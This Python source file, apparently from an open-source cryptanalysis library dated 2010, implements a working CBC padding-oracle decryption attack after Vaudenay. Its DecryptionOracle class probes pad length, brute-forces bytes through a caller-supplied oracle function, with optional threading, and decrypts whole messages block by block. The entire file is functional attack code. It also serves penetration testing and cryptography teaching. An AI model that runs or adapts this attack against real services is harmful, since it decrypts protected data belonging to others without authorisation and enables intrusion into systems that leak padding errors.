'''
Created on Jul 4, 2010

Copyright (C) 2010 ELOI SANFÈLIX
@author: Eloi Sanfelix < eloi AT limited-entropy.com >

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU Lesser General Public License, version 3,
 as published by the Free Software Foundation.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''

import random
import struct
import threading
from .. import buffertools
from .Exceptions import *

class DecryptionOracle:
    '''
    This class implements a decryption oracle based on a given padding oracle.
    The attacked padding scheme is the one defined in PKCS#5 and RFC2040, and maybe other places.
    The attack was first described in the "Security Flaws Induced by CBC Padding. Applications to SSL, IPSEC, WTLS... by Serge Vaudenay"
    '''

    _thread_result = None
    max_threads = None
    log_fh = None

    def __init__(self, oracle, block_size=8, max_threads=1, log_file=None):
        '''
        Creates a new DecryptionOracle object. Receives an oracle function which returns True 
        if the given ciphertext results in a correct padding and False otherwise. A second 
        parameter defining the cipher block size in bytes is also supported (default is 8). 
        '''
        self.oracle = oracle
        self.block_size = block_size
        self.max_threads = max_threads
        self.log_fh = log_file


    def log_message(self, message):
        if self.log_fh != None:
            self.log_fh.write(message+'\n')


    def probe_padding(self, blob, iv=None):
        final = blob[0-self.block_size:]
        prior = blob[0-2*self.block_size:0-self.block_size]
        if len(blob) <= self.block_size:
            # If only one block present, then try to use an IV
            if iv!=None:
                self.log_message("Only one block present, using IV as scratch pad")
                prior = iv
            else:
                self.log_message("Only one block present, using 0 block as scratch pad")
                prior = '\x00'*self.block_size

        # First probe for beginning of pad
        for i in range(0-self.block_size,0):
            if i == -1:
                break
            tweaked = struct.unpack("B", prior[i])[0] ^ 0xFF
            tweaked = struct.pack("B", tweaked)
            if not self.oracle(blob+prior[:i]+tweaked+prior[i+1:]+final):
                break

        pad_length = 0-i
        self.log_message("Testing suspected pad length: %d" % pad_length)
        if pad_length > 1:
            # Verify suspected pad length by changing last pad byte to 1
            # and making sure the padding succeeds
            tweaked = struct.unpack("B", prior[-1])[0] ^ (pad_length^1)
            tweaked = struct.pack("B", tweaked)
            if self.oracle(blob+prior[:-1]+tweaked+final):
                return pad_length
            else:
                return None
        else:
            # Verify by changing pad byte to 2 and brute-force changing
            # second-to-last byte to 2 as well
            tweaked = struct.unpack("B", prior[-1])[0] ^ (2^1)
            tweaked = struct.pack("B", tweaked)
            for j in range(1,256):
                guess = struct.unpack("B", prior[-2])[0] ^ j
                guess = struct.pack("B", guess)
                if self.oracle(blob+prior[:-2]+guess+tweaked+final):
                    print("verified padding through decryption")
                    return pad_length

            return None


    def decrypt_last_bytes(self,block):
        '''
        Decrypts the last bytes of block using the oracle.
        '''
        if(len(block)!=self.block_size):
            raise InvalidBlockError(self.block_size,len(block))
        
        #First we get some random bytes
        #rand = [random.getrandbits(8) for i in range(self.block_size)]
        rand = [0 for i in range(self.block_size)]
        
        for b in range(256):
            
            #XOR with current guess
            rand[-1] ^= b
            #Generate padding string    
            randStr = "".join([ struct.pack("B",i) for i in rand ] )
            if(self.oracle(randStr+block)):
                break
            else:
                #Remove current guess
                rand[-1] ^= b
                
        #Now we have a correct padding, test how many bytes we got!
        for i in range(self.block_size-1):
            #Modify currently tested byte
            rand[i] = rand[i]^0x01
            randStr = "".join([ struct.pack("B",j) for j in rand ] )
            if(not self.oracle(randStr+block)):
                #We got a hit! Byte i is also part of the padding
                paddingLen = self.block_size-i
                #Correct random i
                rand[i] = rand[i]^0x01
                #Return paddingLen final bytes
                return "".join([ struct.pack("B",i^paddingLen) for i in rand[-paddingLen:]])
            
            #Nothing to do when there is no hit. This byte is useless then.

        #Could only recover 1 byte. Return it.    
        return "".join(struct.pack("B",rand[-1]^0x01))


    def _test_value_set(self, prefix, base, suffix, value_set):
        for b in value_set:
            if(self.oracle(prefix+struct.pack("B",base^b)+suffix)):
                self._thread_result = base^b
                break


    def decrypt_next_byte(self,block,known_bytes):
        '''
        Given some known final bytes, decrypts the next byte using the padding oracle. 
        '''
        if(len(block)!=self.block_size):
            raise InvalidBlockError
        numKnownBytes = len(known_bytes)
        
        if(numKnownBytes >= self.block_size):
            return known_bytes
        
        #rand = [random.getrandbits(8) for i in range(self.block_size-numKnownBytes)]
        rand = [0 for i in range(self.block_size-numKnownBytes)]
        prefix = struct.pack("B"*len(rand[0:-1]),*rand[0:-1])
        suffix = list(struct.unpack("B"*numKnownBytes, known_bytes))
        for i in range(0,numKnownBytes):
            suffix[i] ^= numKnownBytes+1
        suffix = struct.pack("B"*len(suffix),*suffix)+block

        # Now we do same trick again to find next byte.
        self._thread_result = None
        threads = []
        for i in range(0,self.max_threads):
            t = threading.Thread(target=self._test_value_set, 
                                 args=(prefix, rand[-1], suffix, range(i,255,self.max_threads)))
            t.start()
            threads.append(t)
            
        for t in threads:
            t.join()
        
        if self._thread_result == None:
            raise Exception

        #  Return previous bytes together with current byte
        return struct.pack("B",self._thread_result^(numKnownBytes+1))+known_bytes        
        #return "".join([struct.pack("B",rand[i]^(numKnownBytes+1)) for i in range(self.block_size-numKnownBytes-1,self.block_size)])
    

    def decrypt_block(self,block):
        '''
        Decrypts the block of ciphertext provided as a parameter.
        '''
        bytes = self.decrypt_last_bytes(block)
        while(len(bytes)!=self.block_size):
            bytes = self.decrypt_next_byte(block,bytes)
        return bytes

    
    def decrypt_message(self,ctext, iv = None):
        '''
        Decrypts a message using CBC mode. If the IV is not provided, it assumes a null IV.
        '''
        #Recover first block
        result = self.decrypt_block(ctext[0:self.block_size])
        
        #XOR IV if provided, else we assume zero IV.
        if( iv != None):
            result = self.xor_strings(result, iv)

        #Recover block by block, XORing with previous ctext block
        for i in range(self.block_size,len(ctext),self.block_size):
            prev = ctext[i-self.block_size:i]
            current = self.decrypt_block(ctext[i:i+self.block_size])
            result += self.xor_strings(prev,current)
        return result

    
    def xor_strings(self,s1,s2):
        result = ""
        for i in range(len(s1)):
            result += struct.pack("B",ord(s1[i])^ord(s2[i]))
        return result

    
    def hex_string(self,data):
        return "".join([ hex(ord(i))+" " for i in data])
